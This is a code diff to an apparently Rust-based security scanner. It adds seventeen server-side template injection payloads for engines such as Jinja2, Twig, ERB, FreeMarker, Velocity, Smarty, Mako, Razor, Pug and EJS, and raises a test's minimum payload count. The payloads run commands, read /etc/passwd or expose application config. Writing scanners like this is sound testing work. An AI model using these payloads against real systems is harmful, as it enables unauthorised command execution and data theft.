@@ -416,6 +416,108 @@ pub fn get_payloads() -> Vec<Payload> {
             TemplateEngine::Jade,
             Severity::High,
         ),
+        (
+            "{{lipsum.__globals__.__builtins__.__import__('os').popen('id').read()}}",
+            "Jinja2 - OS command execution",
+            TemplateEngine::Jinja2,
+            Severity::Critical,
+        ),
+        (
+            "{{config.items()}}",
+            "Jinja2 - Flask config disclosure",
+            TemplateEngine::Jinja2,
+            Severity::Critical,
+        ),
+        (
+            "{{source('/etc/passwd')}}",
+            "Twig - file read",
+            TemplateEngine::Twig,
+            Severity::Critical,
+        ),
+        (
+            "{{['id']|map('system')|join}}",
+            "Twig - command execution",
+            TemplateEngine::Twig,
+            Severity::Critical,
+        ),
+        (
+            "<%= File.read('/etc/passwd') %>",
+            "ERB - file read",
+            TemplateEngine::ERB,
+            Severity::Critical,
+        ),
+        (
+            "<%= IO.popen('id').read %>",
+            "ERB - command execution",
+            TemplateEngine::ERB,
+            Severity::Critical,
+        ),
+        (
+            "<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ ex(\"id\") }",
+            "FreeMarker - Execute RCE",
+            TemplateEngine::FreeMarker,
+            Severity::Critical,
+        ),
+        (
+            "#set($x = '')${x.getClass().forName('java.lang.Runtime').getRuntime().exec('id')}",
+            "Velocity - command execution",
+            TemplateEngine::Velocity,
+            Severity::Critical,
+        ),
+        (
+            "{php}system('id');{/php}",
+            "Smarty - command execution",
+            TemplateEngine::Smarty,
+            Severity::Critical,
+        ),
+        (
+            "{{#with (lookup . \"__proto__\")}}{{/with}}",
+            "Handlebars - prototype access",
+            TemplateEngine::Handlebars,
+            Severity::High,
+        ),
+        (
+            "<% import os %>${os.popen('id').read()}",
+            "Mako - command execution",
+            TemplateEngine::Mako,
+            Severity::Critical,
+        ),
+        (
+            "@(new System.Diagnostics.Process { StartInfo = new System.Diagnostics.ProcessStartInfo { FileName = \"cmd\", Arguments = \"/c id\" } }.Start())",
+            "Razor - command execution",
+            TemplateEngine::DotNet,
+            Severity::Critical,
+        ),
+        (
+            "- require('child_process').execSync('id')",
+            "Pug - command execution",
+            TemplateEngine::Jade,
+            Severity::Critical,
+        ),
+        (
+            "<%= global.process.mainModule.require('child_process').execSync('id') %>",
+            "EJS - command execution",
+            TemplateEngine::EJS,
+            Severity::Critical,
+        ),
+        (
+            "{{_self.env.registerUndefinedFilterCallback(\"system\")}}{{_self.env.getFilter(\"id\")}}",
+            "Twig - filter injection",
+            TemplateEngine::Twig,
+            Severity::Critical,
+        ),
+        (
+            "{self::getStream('file:///etc/passwd')}",
+            "Smarty - file read",
+            TemplateEngine::Smarty,
+            Severity::Critical,
+        ),
+        (
+            "$util.include(\"file:///etc/passwd\")",
+            "Velocity - file read",
+            TemplateEngine::Velocity,
+            Severity::Critical,
+        ),
     ];
 
     for (payload, desc, engine, severity) in ssti_payloads {
@@ -531,7 +633,7 @@ mod tests {
     fn minimum_payload_count() {
         let payloads = get_payloads();
         assert!(
-            payloads.len() >= 8,
+            payloads.len() >= 20,
             "Must have SSTI coverage across engines, got {}",
             payloads.len()
         );
